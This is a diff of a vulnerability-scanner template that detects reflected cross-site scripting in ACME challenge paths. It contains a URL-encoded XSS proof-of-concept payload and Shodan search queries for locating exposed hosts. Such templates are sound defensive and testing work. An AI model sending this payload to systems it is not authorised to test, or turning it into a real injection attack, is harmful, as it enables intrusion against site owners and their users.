@@ -1,5 +1,4 @@
 id: acme-challenge-path-xss
-
 info:
   name: ACME Challenge Path - Reflected Cross-Site Scripting
   author: pussycat0x
@@ -9,20 +8,20 @@ info:
   reference:
     - https://labs.detectify.com/security-guidance/xss-using-quirky-implementations-of-acme-http-01/
     - https://www.acunetix.com/vulnerabilities/web/cross-site-scripting-in-http-01-acme-challenge-implementation/
+  classification:
+    cwe-id:
+      - CWE-80
   metadata:
     runzero-match: service["http.body"] matches "(?i)acme-challenge"
     shodan-query: html:"acme-challenge"
-  tags: xss,acme,misconfig,vuln
-
+  tags: acme,misconfig,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E"
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
-          - 'status_code == 200'
-          - 'contains(body, "<script>alert(document.domain)</script>")'
-        condition: and
-
+          - status_code == 200
+          - contains(body, "<script>alert(document.domain)</script>")
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E'
